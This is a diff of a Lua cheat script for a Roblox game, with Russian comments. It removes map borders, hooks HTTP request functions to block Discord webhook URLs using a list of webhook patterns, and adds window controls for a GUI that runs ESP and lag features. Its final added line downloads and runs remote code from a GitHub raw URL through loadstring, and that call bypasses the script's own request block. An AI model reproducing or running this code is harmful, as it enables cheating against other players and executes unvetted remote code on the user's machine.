@@ -1,4 +1,147 @@
+-- == УДАЛЕНИЕ ГРАНИЦ КАРТЫ ==
+pcall(function()
+    local mapFolder = workspace:FindFirstChild("Map")
+    if mapFolder then
+        local borders = mapFolder:FindFirstChild("Borders")
+        if borders then
+            borders:Destroy()
+            print("✅ workspace.Map.Borders успешно удалены!")
+        else
+            warn("⚠️ workspace.Map.Borders не найдены")
+        end
+    else
+        warn("⚠️ workspace.Map не найдена")
+    end
+end)
+
 -- == Гарантированное получение LocalPlayer ==
+
+-- == Безопасный HTTP Block с исключениями ==
+local G = (getgenv and getgenv()) or _G
+
+-- Кеш для отслеживания уже залогированных URL
+local logged_urls = {}
+local log_cooldown = 20  -- Показывать повторное сообщение только раз в 5 секунд
+
+local function clog(msg, url)
+    local current_time = tick()
+
+    -- Проверяем, логировали ли мы этот URL недавно
+    if url and logged_urls[url] then
+        local time_diff = current_time - logged_urls[url]
+        if time_diff < log_cooldown then
+            return  -- Не логируем, если прошло меньше cooldown секунд
+        end
+    end
+
+    -- Обновляем время последнего лога
+    if url then
+        logged_urls[url] = current_time
+    end
+
+    msg = '[SAFE-BLOCK] ' .. tostring(msg)
+    if warn then warn(msg) else print(msg) end
+    if G.rconsoleprint then G.rconsoleprint(msg .. '\n') end
+end
+
+-- Паттерны для обнаружения Discord webhook URL
+local DISCORD_PATTERNS = {
+    "discord%.com/api/webhooks/",
+    "discordapp%.com/api/webhooks/",
+    "webhook%.lewisakura%.moe/api/webhooks/",
+    "hooks%.hyra%.io/api/webhooks/",
+    "canary%.discord%.com/api/webhooks/",
+    "ptb%.discord%.com/api/webhooks/"
+}
+
+-- Белый список - разрешенные паттерны (не блокируются)
+local WHITELIST_PATTERNS = {
+    "discord%.com/api/v%d+/channels/%d+/messages",  -- Каналы Discord
+    "discordapp%.com/api/v%d+/channels/%d+/messages",
+    "discord%.com/api/v%d+/guilds/",  -- API гильдий
+    "discord%.com/api/v%d+/users/"    -- API пользователей
+}
+
+local function isWhitelisted(url)
+    if type(url) ~= "string" then return false end
+    url = url:lower()
+
+    for _, pattern in ipairs(WHITELIST_PATTERNS) do
+        if url:match(pattern) then
+            return true
+        end
+    end
+
+    return false
+end
+
+local function isDiscordWebhook(url)
+    if type(url) ~= "string" then return false end
+    url = url:lower()
+
+    for _, pattern in ipairs(DISCORD_PATTERNS) do
+        if url:match(pattern) then
+            return true
+        end
+    end
+
+    if url:match("webhooks/%d+/[%w%-_]+") then
+        return true
+    end
+
+    return false
+end
+
+local function block_request(opts)
+    local url = 'unknown'
+    if type(opts) == 'table' then
+        url = opts.Url or opts.url or tostring(opts)
+    else
+        url = tostring(opts)
+    end
+
+    -- Проверяем белый список ПЕРВЫМ (приоритет)
+    if isWhitelisted(url) then
+        clog('ALLOWED (whitelist): ' .. url, url)
+        -- Пропускаем запрос, вызываем оригинальную функцию
+        if G._original_request then
+            return G._original_request(opts)
+        else
+            return { StatusCode = 200, Headers = {}, Body = '{"allowed":true}', Success = true }
+        end
+    end
+
+    -- Специальная блокировка Discord webhooks
+    if isDiscordWebhook(url) then
+        clog('BLOCKED DISCORD WEBHOOK: ' .. url, url)
+        return {
+            StatusCode = 403,
+            Headers = {},
+            Body = '{"message":"403: Forbidden","code":50013}',
+            Success = false
+        }
+    end
+
+    clog('BLOCKED: ' .. url, url)
+    return { StatusCode = 200, Headers = {}, Body = '{"blocked":true}', Success = true }
+end
+
+local function safe_replace(tableObj, key, new_func)
+    -- Сохраняем оригинальную функцию
+    if not G._original_request and tableObj[key] then
+        G._original_request = tableObj[key]
+    end
+
+    local succ = pcall(function() tableObj[key] = new_func end)
+    if succ then clog('Replaced ' .. tostring(key)) end
+    return succ
+end
+
+safe_replace(G, 'request', block_request)
+safe_replace(G, 'http_request', block_request)
+pcall(function() if G.syn then safe_replace(G.syn, 'request', block_request) end end)
+pcall(function() if G.http then safe_replace(G.http, 'request', block_request) end end)
+
 local Players = game:GetService('Players')
 local player = Players.LocalPlayer
 if not player then
@@ -326,7 +469,7 @@ local OBJECT_EMOJIS = {['La Vacca Saturno Saturita'] = '🐮', ['Nooo My Hotspot
     ['Pot Hotspot'] = ' 📱',['La Grande Combinasion'] = '❗️',['Garama and Madundung'] = '🥫',
     ['Secret Lucky Block'] = '⬛️',['Strawberry Elephant'] = '🐘',['Nuclearo Dinossauro'] = '🦕',['Spaghetti Tualetti'] = '🚽',
     ['Chicleteira Bicicleteira'] = '🚲',['Los Combinasionas'] = '⚒️',['Ketchuru and Musturu'] = '🍾',['Los Hotspotsitos'] = '☎️',['Tacorita Bicicleta'] = '🌮',
-    ['Los Nooo My Hotspotsitos'] = '🔔',['Esok Sekolah'] = '🏠',['Los Bros'] = '✊',["Tralaledon"] = "🦈",["La Extinct Grande"] = "🦴",["Las Sis"] = "👧",["Los Chicleteiras"] = "🚳",["Celularcini Viciosini"] = "📢",["Dragon Cannelloni"] = "🐉",["La Secret Combinasion"] = "❓",["Burguro And Fryuro"] = "🍔",["Chillin Chili"] = "🌶"
+    ['Los Nooo My Hotspotsitos'] = '🔔',['Esok Sekolah'] = '🏠',['Los Bros'] = '✊',["Tralaledon"] = "🦈",["La Extinct Grande"] = "🦴",["Las Sis"] = "👧",["Los Chicleteiras"] = "🚳",["Celularcini Viciosini"] = "📢",["Dragon Cannelloni"] = "🐉",["La Secret Combinasion"] = "❓",["Burguro And Fryuro"] = "🍔"
 }
 
 -- == ОПТИМАЛЬНЫЙ ESP ==
@@ -548,8 +691,159 @@ local function buildUI()
     grad.Rotation = 35
     grad.Offset = Vector2.new(-1.1,0)
     TweenService:Create(grad,TweenInfo.new(2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{Offset=Vector2.new(1.1,0)}):Play()
+
+    -- === ПРАВИЛЬНЫЕ КНОПКИ УПРАВЛЕНИЯ (СКРЫТИЕ buttonArea) ===
+
+    sidebar.ClipsDescendants = true
+
+    -- Контейнер для кнопок управления
+    local windowControls = Instance.new("Frame", sidebar)
+    windowControls.Name = "WindowControls"
+    windowControls.Size = UDim2.new(0, 70, 0, 30)
+    windowControls.Position = UDim2.new(1, -75, 0, 5)
+    windowControls.BackgroundTransparency = 1
+    windowControls.ZIndex = 25
+
+    -- Кнопка Minimize (желтая)
+    local btnMin = Instance.new("TextButton", windowControls)
+    btnMin.Name = "BtnMinimize"
+    btnMin.Text = "-"
+    btnMin.Font = Enum.Font.GothamBold
+    btnMin.TextSize = 24
+    btnMin.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btnMin.BackgroundColor3 = Color3.fromRGB(255, 189, 68)
+    btnMin.Size = UDim2.new(0, 28, 0, 28)
+    btnMin.Position = UDim2.new(0, 0, 0, 1)
+    btnMin.BorderSizePixel = 0
+    btnMin.AutoButtonColor = false
+    btnMin.ZIndex = 26
+
+    Instance.new("UICorner", btnMin).CornerRadius = UDim.new(1, 0)
+
+    -- Кнопка Close (красная)
+    local btnClose = Instance.new("TextButton", windowControls)
+    btnClose.Name = "BtnClose"
+    btnClose.Text = "X"
+    btnClose.Font = Enum.Font.GothamBold
+    btnClose.TextSize = 15
+    btnClose.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btnClose.BackgroundColor3 = Color3.fromRGB(255, 95, 87)
+    btnClose.Size = UDim2.new(0, 28, 0, 28)
+    btnClose.Position = UDim2.new(0, 35, 0, 1)
+    btnClose.BorderSizePixel = 0
+    btnClose.AutoButtonColor = false
+    btnClose.ZIndex = 26
+
+    Instance.new("UICorner", btnClose).CornerRadius = UDim.new(1, 0)
+
+    -- Переменные
+    local isMinimized = false
+    local originalSidebarSize = nil
+
+    -- Hover Minimize
+    btnMin.MouseEnter:Connect(function()
+        TweenService:Create(btnMin, TweenInfo.new(0.12), {
+            BackgroundColor3 = Color3.fromRGB(255, 210, 100)
+        }):Play()
+    end)
+
+    btnMin.MouseLeave:Connect(function()
+        TweenService:Create(btnMin, TweenInfo.new(0.12), {
+            BackgroundColor3 = Color3.fromRGB(255, 189, 68)
+        }):Play()
+    end)
+
+    -- Hover Close
+    btnClose.MouseEnter:Connect(function()
+        TweenService:Create(btnClose, TweenInfo.new(0.12), {
+            BackgroundColor3 = Color3.fromRGB(255, 120, 110)
+        }):Play()
+    end)
+
+    btnClose.MouseLeave:Connect(function()
+        TweenService:Create(btnClose, TweenInfo.new(0.12), {
+            BackgroundColor3 = Color3.fromRGB(255, 95, 87)
+        }):Play()
+    end)
+
     local buttonArea = Instance.new('Frame',sidebar)
     buttonArea.BackgroundTransparency = 1
+    -- === ФУНКЦИИ СВОРАЧИВАНИЯ И ЗАКРЫТИЯ ===
+
+    -- Сохраняем оригинальный размер ПОСЛЕ создания всего GUI
+    task.spawn(function()
+        task.wait(0.3)
+        originalSidebarSize = sidebar.Size
+        print("📏 Размер GUI сохранен:", originalSidebarSize)
+    end)
+
+    -- СВОРАЧИВАНИЕ (ПРОСТО СКРЫВАЕМ buttonArea)
+    btnMin.MouseButton1Click:Connect(function()
+        isMinimized = not isMinimized
+
+        if isMinimized then
+            -- Сохраняем размер
+            if not originalSidebarSize then
+                originalSidebarSize = sidebar.Size
+            end
+
+            print("🔽 СВОРАЧИВАЕМ - скрываем buttonArea...")
+
+            -- ПРОСТО СКРЫВАЕМ buttonArea
+            buttonArea.Visible = false
+
+            -- Сворачиваем sidebar до 38px
+            TweenService:Create(sidebar, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                Size = UDim2.new(0, 220, 0, 38)
+            }):Play()
+
+            btnMin.Text = "+"
+            print("✅ GUI свернут - buttonArea скрыт (Visible = false)")
+
+        else
+            print("🔼 РАЗВОРАЧИВАЕМ - показываем buttonArea...")
+
+            -- ПОКАЗЫВАЕМ buttonArea
+            buttonArea.Visible = true
+
+            -- Разворачиваем sidebar обратно
+            if originalSidebarSize then
+                TweenService:Create(sidebar, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                    Size = originalSidebarSize
+                }):Play()
+            end
+
+            btnMin.Text = "-"
+            print("✅ GUI развернут - buttonArea показан (Visible = true)")
+        end
+    end)
+
+    -- ЗАКРЫТИЕ GUI
+    btnClose.MouseButton1Click:Connect(function()
+        print("❌ Закрываем GUI...")
+
+        TweenService:Create(sidebar, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+            Size = UDim2.new(0, 0, 0, 0)
+        }):Play()
+
+        task.wait(0.25)
+
+        pcall(function()
+            if heartbeatConnection then stopESP() end
+        end)
+        pcall(function()
+            if FPSDevourer and FPSDevourer.running then FPSDevourer:Stop() end
+        end)
+        pcall(function()
+            if isCameraRaised then disableFollowCamera() end
+        end)
+
+        pcall(function() uiRoot:Destroy() end)
+        pcall(function() if esp3DRoot then esp3DRoot:Destroy() end end)
+
+        print("✅ GUI полностью удален")
+    end)
+
     buttonArea.Position = UDim2.new(0, 10, 0, 38)
     buttonArea.Size = UDim2.new(1, -20, 1, -52)
     local layout = Instance.new("UIListLayout",buttonArea)
@@ -1048,3 +1342,4 @@ workspace.DescendantAdded:Connect(function(descendant)
         createBeautifulPurpleRemainingTime()
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
